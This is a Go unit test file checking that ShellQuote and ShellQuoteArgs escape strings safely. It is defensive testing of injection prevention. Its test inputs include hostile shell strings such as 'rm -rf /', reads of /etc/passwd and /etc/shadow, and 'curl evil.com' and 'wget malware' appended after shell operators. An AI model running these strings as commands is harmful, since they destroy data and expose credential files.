package util

import "testing"

func TestShellQuote(t *testing.T) {
	tests := []struct {
		input    string
		expected string
	}{
		{"hello", "hello"},
		{"hello world", "'hello world'"},
		{"", "''"},
		{"it's", "'it'\\''s'"},
		{"$(rm -rf /)", "'$(rm -rf /)'"},
		{"; rm -rf /", "'; rm -rf /'"},
		{"normal-flag", "normal-flag"},
		{"--json", "--json"},
		{"value with spaces", "'value with spaces'"},
		{"`whoami`", "'`whoami`'"},
		{"foo\nbar", "'foo\nbar'"},
		{"hello'world", "'hello'\\''world'"},
	}

	for _, tt := range tests {
		result := ShellQuote(tt.input)
		if result != tt.expected {
			t.Errorf("ShellQuote(%q) = %q, want %q", tt.input, result, tt.expected)
		}
	}
}

func TestShellQuoteArgs(t *testing.T) {
	args := []string{"status", "--json", "hello world"}
	result := ShellQuoteArgs(args)
	expected := "status --json 'hello world'"
	if result != expected {
		t.Errorf("ShellQuoteArgs(%v) = %q, want %q", args, result, expected)
	}
}

func TestShellQuote_InjectionPrevention(t *testing.T) {
	// These should all be safely quoted
	dangerous := []string{
		"; rm -rf /",
		"$(cat /etc/passwd)",
		"`cat /etc/shadow`",
		"|| curl evil.com",
		"&& wget malware",
		"foo; echo pwned",
	}
	for _, input := range dangerous {
		result := ShellQuote(input)
		// Result should be single-quoted, preventing execution
		if result == input {
			t.Errorf("ShellQuote(%q) should have quoted the input", input)
		}
	}
}
